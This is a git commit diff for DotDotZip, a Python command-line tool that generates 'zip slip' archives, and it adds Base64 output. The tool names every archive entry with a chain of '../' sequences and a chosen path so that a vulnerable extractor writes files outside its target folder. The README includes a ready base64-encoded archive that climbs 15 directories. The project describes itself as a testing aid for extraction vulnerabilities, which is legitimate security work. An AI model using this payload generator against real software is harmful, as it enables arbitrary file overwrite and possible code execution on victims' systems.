c2acc88778e2da3019d65124d2bcd81aae71683e
Kenny Strawn <Kenny.Strawn@gmail.com>
2026-09-03 14:35:54 -0700

    0.2.3: Add Base64 encode functionality

--- README.md
+++ README.md
@@ -12,24 +12,32 @@ pipx install git+https://github.com/kennystrawnmusic/DotDotZip
 
 ```
 $ python3 dotdotzip.py --help
-usage: dotdotzip.py [-h] [--traverse-count TRAVERSE_COUNT] --zip-name ZIP_NAME
-                    --prepend-path PREPEND_PATH
+usage: dotdotzip.py [-h] [--traverse-count TRAVERSE_COUNT]
+                    [--zip-name ZIP_NAME] --prepend-path PREPEND_PATH
                     --pack-files PACK_FILES [PACK_FILES ...]
 
-DotDotZip v. 0.2.2
+DotDotZip v. 0.2.3
 
 options:
   -h, --help            show this help message and exit
   --traverse-count TRAVERSE_COUNT
                         Number of '../' sequences to prepend
-  --zip-name ZIP_NAME   Name of the output ZIP archive
+  --zip-name ZIP_NAME   Name of the output ZIP archive (leave blank to output
+                        Base64 encoded ZIP to the console)
   --prepend-path PREPEND_PATH
                         Extra path to prepend
   --pack-files PACK_FILES [PACK_FILES ...]
                         Names of files to pack
 ```
 
-Example:
+Example (Base64):
+
+```
+$ python3 dotdotzip.py --prepend-path '/Users/realkstrawn93/Desktop' --traverse-count 15 --pack-files pyproject.toml
+UEsDBBQAAAAAAEt0I1312nQfKAEAACgBAABXAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vVXNlcnMvcmVhbGtzdHJhd245My9EZXNrdG9wL3B5cHJvamVjdC50b21sW2J1aWxkLXN5c3RlbV0KcmVxdWlyZXMgPSBbInNldHVwdG9vbHM+PTYxLjAuMCJdCmJ1aWxkLWJhY2tlbmQgPSAic2V0dXB0b29scy5idWlsZF9tZXRhIgoKW3Byb2plY3RdCm5hbWUgPSAiZG90ZG90emlwIgp2ZXJzaW9uID0gIjAuMi4zIgpkZXNjcmlwdGlvbiA9ICJBIHV0aWxpdHkgZm9yIGdlbmVyYXRpbmcgXCJ6aXAgc2xpcFwiIHBheWxvYWRzIGZvciB0ZXN0aW5nIHppcCBmaWxlIGV4dHJhY3Rpb24gdnVsbmVyYWJpbGl0aWVzLiIKCltwcm9qZWN0LnNjcmlwdHNdCmRvdGRvdHppcCA9ICJkb3Rkb3R6aXA6bWFpbiJQSwECFAMUAAAAAABLdCNd9dp0HygBAAAoAQAAVwAAAAAAAAAAAAAApIEAAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vVXNlcnMvcmVhbGtzdHJhd245My9EZXNrdG9wL3B5cHJvamVjdC50b21sUEsFBgAAAAABAAEAhQAAAJ0BAAAAAA==
+```
+
+Example (filesystem):
 
 ```
 $ python3 dotdotzip.py --zip-name test.zip --prepend-path '/Users/realkstrawn93/Desktop' --traverse-count 15 --pack-files pyproject.toml
--- dotdotzip.py
+++ dotdotzip.py
@@ -1,6 +1,9 @@
 import tomllib
+import base64
+
 from zipfile import ZipFile
 from argparse import ArgumentParser
+from io import BytesIO
 
 def version_from_pyproject_toml():
     try:
@@ -14,7 +17,7 @@ def main():
     parser = ArgumentParser(description=f"DotDotZip v. {version_from_pyproject_toml()}")
     
     parser.add_argument("--traverse-count", type=int, default=5, help="Number of '../' sequences to prepend")
-    parser.add_argument("--zip-name", type=str, required=True, help="Name of the output ZIP archive")
+    parser.add_argument("--zip-name", type=str, help="Name of the output ZIP archive (leave blank to output Base64 encoded ZIP to the console)")
     parser.add_argument("--prepend-path", type=str, required=True, help="Extra path to prepend")
     parser.add_argument("--pack-files", type=str, nargs='+', required=True, help="Names of files to pack")
     
@@ -22,12 +25,24 @@ def main():
     
     traverse_str = '../'*args.traverse_count
     
-    with ZipFile(args.zip_name, 'w') as zf:
-        for file_name in args.pack_files:
-            try:
-                zf.write(file_name, arcname=f"{traverse_str}{args.prepend_path}/{file_name}")
-            except FileNotFoundError:
-                print(f"Error: The file '{file_name}' does not exist.")
+    if not args.zip_name:
+        with BytesIO() as zip_buffer:
+            with ZipFile(zip_buffer, 'w') as zf:
+                for file_name in args.pack_files:
+                    try:
+                        zf.write(file_name, arcname=f"{traverse_str}{args.prepend_path}/{file_name}")
+                    except FileNotFoundError:
+                        print(f"Error: The file '{file_name}' does not exist.")
+            zip_buffer.seek(0)
+            print(base64.b64encode(zip_buffer.read()).decode('utf-8'))
+            
+    else:
+        with ZipFile(args.zip_name, 'w') as zf:
+            for file_name in args.pack_files:
+                try:
+                    zf.write(file_name, arcname=f"{traverse_str}{args.prepend_path}/{file_name}")
+                except FileNotFoundError:
+                    print(f"Error: The file '{file_name}' does not exist.")
 
 if __name__ == '__main__':
     main()
